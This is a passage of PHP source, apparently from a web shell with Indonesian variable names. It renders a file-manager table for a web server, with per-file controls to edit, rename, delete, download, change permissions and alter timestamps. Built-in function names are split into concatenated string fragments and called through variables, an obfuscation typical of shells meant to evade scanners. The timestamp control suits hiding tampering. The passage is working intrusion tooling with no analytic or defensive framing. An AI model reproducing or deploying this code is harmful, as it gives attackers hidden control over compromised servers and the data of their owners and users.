	<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
	<input type=\"hidden\" name=\"type\" value=\"dir\">
	<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
	<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
	</form></center></td>
	</tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
$skd = "10"."24";
foreach($lokasinya as $mekicina) {
	$euybray = $lokasi."/".$mekicina;
	if(!$ifi("$lokasi/$mekicina")) continue;
	$size = $fsz("$lokasi/$mekicina")/$skd;
	$size = $rd($size,3);
	if($size >= $skd){
	$size = $rd($size/$skd,2).' M'.'B';
} else {
	$size = $size.' K'.'B';
}

echo "<tr>
<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&loknya=$lokasi\">$mekicina</a></td>
<td><center>".$size."</center></td>
<td><center>".fdt($euybray)."</center></td>
<td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>
<td><center>";
if($isw("$lokasi/$mekicina")) echo '<font color="green">';
elseif(!$isr("$lokasi/$mekicina")) echo '<font color="red">';
echo statusnya("$lokasi/$mekicina");
if($isw("$lokasi/$mekicina") || !$isr("$lokasi/$mekicina")) echo '</font>';
echo "</center></td><td><center>
<form method=\"post\" action=\"?pilihan&loknya=$lokasi\">
<button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-down"."load' style='color: #fff'></i></button>
<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
<input type=\"hidden\" name=\"type\" value=\"fi"."le\">
<input type=\"hidden\" name=\"name\" value=\"$mekicina\">
<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$mekicina\">
</form></center></td>
</tr>";
}
echo '</tr></td></table></table>';
author();

function statusnya($fl){
	$a = "sub"."st"."r";
	$b = "s"."pri"."ntf";
	$c = "fil"."eper"."ms";
$izin = $a($b('%o', $c($fl)), -4);
return $izin;
}
?>
